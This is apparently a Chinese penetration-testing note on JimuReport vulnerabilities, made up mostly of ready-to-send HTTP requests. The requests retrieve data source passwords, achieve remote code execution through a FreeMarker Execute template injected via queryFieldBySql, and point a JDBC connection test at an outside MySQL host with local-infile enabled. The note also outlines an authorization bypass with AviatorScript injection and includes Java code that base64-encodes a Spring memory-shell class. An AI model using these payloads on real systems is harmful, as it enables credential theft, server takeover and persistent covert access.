## **积木报表漏洞**
积木报表管理数据集，点击设计报表可以运行sql，左边维护可以查看数据库源密码和jdbc。
<https://help.jimureport.com/base/dbsource>

http://:后端端口/jmreport/list?token=279c09b43f684d6eba35e18a2ec39076

^
查看数据源账号密码
```
GET /jmreport/getDataSourceById?id=891608839425720320 HTTP/1.1
Host: 206.6:88
Accept: application/json, text/plain, */*
X-Tenant-Id: null
Accept-Language: zh-CN,zh;q=0.9
tenantId: null
X-Access-Token: dad4844c24bc4345b892dd8f4592abeb
token: dad4844c24bc4345b892dd8f4592abeb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Content-Type: application/json;charset=utf-8
JmReport-Tenant-Id: null
Referer: http://26.6:88/jmreport/index/873819673753341952?token=dad4844c24bc4345b892dd8f4592abeb
Authorization: Bearer dad4844c24bc4345b892dd8f4592abeb
Accept-Encoding: gzip, deflate
```

^
### **执行SQL进行表达式注入RCE**

```
POST /jmreport/queryFieldBySql HTTP/1.1
Host: 26:88
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Language: zh-CN,zh;q=0.9
X-Access-Token: 279c09b43f684d6eba35e18a2ec39076
tenantId: null
X-Sign: AA8052BF21C91A1517687E709996F69F
Accept: application/json, text/plain, */*
X-Tenant-Id: null
Accept-Encoding: gzip, deflate
X-TIMESTAMP: 1747983344072
Referer: http://6:88/jmreport/index/876671520973312000?token=279c09b43f684d6eba35e18a2ec39076
token: 279c09b43f684d6eba35e18a2ec39076
Authorization: Bearer 279c09b43f684d6eba35e18a2ec39076
Origin: http://26.6:88
Content-Length: 50

{"sql":"select 'ycxhhh'","dbSource":"","type":"0"}
```
```
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 105

{"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"whoami \") }'" }
```




^
#### **jdbc**
```
POST /jmreport/testConnection HTTP/1.1
Host: 173.159.173:8095
Origin: http://173.159.173:8095
Content-Type: application/json;charset=UTF-8
X-Access-Token: null
Accept: application/json, text/plain, */*
Cache-Control: no-cache
token: null
X-Tenant-Id: null
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Pragma: no-cache
JmReport-Tenant-Id: null
Content-Length: 198

{"dbType":"MYSQL5.5","dbDriver":"com.mysql.jdbc.Driver","dbUrl":"jdbc:mysql://47.109.58.205:3306/test2?allowLoadLocalInfile=true&allowUrlInLocalInfile=true#","dbUsername":"root","dbPassword":"*****"}
```



^
#### **AviatorScript表达式注入漏洞**
v1.6.0 ＜ JimuReport ≤ 1.7.8

先save再show未授权注入。


JeecgBoot JimuReport 1.7.8版本及之前版本存在安全漏洞：该漏洞源于权限设置不安全，攻击者在请求中添加特定参数，即可绕过授权机制。
并通过 Aviator 表达式注入在1.6.0版本后实现远程代码执行。

<https://xz.aliyun.com/news/14842>
<https://www.cnblogs.com/CVE-Lemon/p/18392679>

将class文件base64编码
base64 xx.class
或用下面代码
```
package org.springframework.cloud.gateway.sample;

import org.springframework.util.Base64Utils;

import java.io.*;
import java.nio.charset.StandardCharsets;

public class EncodeShell {
   public static void main(String[] args){
      byte[] data = null;
      try {
         InputStream in = new FileInputStream("E:\\代审计划\\spring-cloud-gateway-3.0.6\\spring-cloud-gateway-sample\\target\\classes\\SpringRequestMappingMemshell.class");
         data = new byte[in.available()];
         in.read(data);
         in.close();
      } catch (IOException e) {
         e.printStackTrace();
      }
      String shellStr = Base64Utils.encodeToString(data);
      System.out.println(shellStr);
      try {
         OutputStream out = new FileOutputStream("ShellStr.txt");
         out.write(shellStr.getBytes(StandardCharsets.UTF_8));
         out.flush();
         out.close();
      } catch (IOException e) {
         e.printStackTrace();
      }
   }
}
```